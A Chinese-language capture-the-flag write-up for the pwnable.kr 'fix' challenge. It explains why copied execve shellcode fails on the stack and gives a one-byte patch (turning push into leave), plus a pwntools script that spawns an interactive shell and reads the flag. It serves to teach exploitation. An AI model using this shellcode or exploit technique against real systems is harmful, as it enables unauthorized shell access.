---
title: pwnable.kr-fix
date: 2018-02-27 22:46:00
tags: [pwnable.kr,PWN]
categories: CTF
---
# 前言
看似简单的改代码题，但是还是需要强大的汇编知识。花了很长时间，主要是自己对指令不是很熟悉。
# 分析
先分析源码`fix.c`
```c
#include <stdio.h>

// 23byte shellcode from http://shell-storm.org/shellcode/files/shellcode-827.php
char sc[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
		"\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";

void shellcode(){
	// a buffer we are about to exploit!
	char buf[20];

	// prepare shellcode on executable stack!
	strcpy(buf, sc);

	// overwrite return address!
	*(int*)(buf+32) = buf;

	printf("get shell\n");
}

int main(){
        printf("What the hell is wrong with my shellcode??????\n");
        printf("I just copied and pasted it from shell-storm.org :(\n");
        printf("Can you fix it for me?\n");

	unsigned int index=0;
	printf("Tell me the byte index to be fixed : ");
	scanf("%d", &index);
	fflush(stdin);

	if(index > 22)	return 0;

	int fix=0;
	printf("Tell me the value to be patched : ");
	scanf("%d", &fix);

	// patching my shellcode
	sc[index] = fix;	

	// this should work..
	shellcode();
	return 0;
}

```
程序逻辑简单，如题目所说`shellcode`无法正确执行，但我们只能修改其中一个字节。看了`shellcode`函数，开始以为是地址布置出错，但是看了反汇编代码发现返回地址的计算没有错误，于是反汇编一下`shellcode`看看有没有问题
```nasm
Python 2.7.12 (default, Dec  4 2017, 14:50:18) 
[GCC 5.4.0 20160609] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import *
>>> a="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
>>> a+="\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
>>> print disasm(a)
   0:   31 c0                   xor    eax,eax
   2:   50                      push   eax
   3:   68 2f 2f 73 68          push   0x68732f2f
   8:   68 2f 62 69 6e          push   0x6e69622f
   d:   89 e3                   mov    ebx,esp
   f:   50                      push   eax
  10:   53                      push   ebx
  11:   89 e1                   mov    ecx,esp
  13:   b0 0b                   mov    al,0xb
  15:   cd 80                   int    0x80
>>> 

```
仔细分析代码发现`shellcode`并没有问题，后来放在gdb调试的时候发现在执行`shellcode`的时候，`shellcode`的代码会变化。。这就很奇怪了，啥问题呢？仔细分析栈空间的排布就知道了，`shellcode`布置在栈中占了`23`个字节，`buf`变量的位置是`ebp-0x1c`（反汇编代码就能看出），所以`shellcode`尾部达到了`ebp-5`,然而函数返回执行`shellcode`时`esp`指向返回地址下面4个字节，这里相距`shellcode`有`13`字节，所以后续的`pop`操作只能执行3次，否则就会覆盖`shellcode`的部分代码，造成执行失败。
知道了失败的原因那么如何通过只修改一个字节达到执行成功的目的呢？这里确实得熟悉汇编指令才行，我的思路是修改`push eax`为`leave`指令（他们都是单子节指令），这样当执行到这里时就相当于执行了`mov esp，ebp;pop ebp`。于是栈顶就下降了后续的`pop`就不会修改`shellcode`了，但是这样的话`shellcode`虽然会正确执行但是会报错
```bash
root@1:~/桌面/test$ ./fix
What the hell is wrong with my shellcode??????
I just copied and pasted it from shell-storm.org :(
Can you fix it for me?
Tell me the byte index to be fixed : 15
Tell me the value to be patched : 201
get shell
/bin//sh: 0: Can't open ����
                             P��c
root@1:~/桌面/test$ 
```
这说明我们已经成功执行`/bin/sh`了，但是似乎这样的修改增加`/bin/sh`的参数。确实如此，执行`leave`指令后，栈已经变了，就无法保证`ecx`指向的第二个字符串是0,所以可能就会多出别的参数。这里可以根据错误提示新建一个和错误提示的一样的文件，然后在里面写入`sh`，这样当再次执行程序时，就会试图执行这个文件的命令了。另外这个多出的参数由于是栈上的数据，而不是栈地址，所以它不具有随机性，所以这种方法可行而且实际上确实可行。下面贴出exp
```python
from pwn import *

def work():
    context(arch='i386',os='linux',log_level='info')
    the_path = '/home/fix/fix'
    r = process(the_path)
    
    #r.recvuntil("fixed : ")
    r.sendline("15")
    #r.recvuntil("patched : ")
    r.sendline("201")
    r.recvuntil('get shell\n')
    error_text = r.recvline()
    r.kill()
    
    a = error_text.find('open ')
    fname = error_text[a+5:-1]
    f = open(fname,'w')
    f.write('sh\n')
    f.close()
    
    r = process(the_path)
    r.sendline("15")
    r.sendline("201")
    r.interactive()

work()
```
```bash
fix@ubuntu:/tmp$ python 1.py
[+] Starting local process '/home/fix/fix': Done
[*] Stopped program '/home/fix/fix'
[+] Starting local process '/home/fix/fix': Done
[*] Switching to interactive mode
What the hell is wrong with my shellcode??????
I just copied and pasted it from shell-storm.org :(
Can you fix it for me?
Tell me the byte index to be fixed : Tell me the value to be patched : get shell
$ ls
ls: cannot open directory '.': Permission denied
$ cd /home/fix
$ ls
fix  fix.c  flag  intended_solution.txt
$ cat flag
Sorry for blaming shell-strom.org :) it was my ignorance!
$  
```
注意要把exp上传题目平台执行
# 总结
虽说是改代码的题，但是还是学到了很多。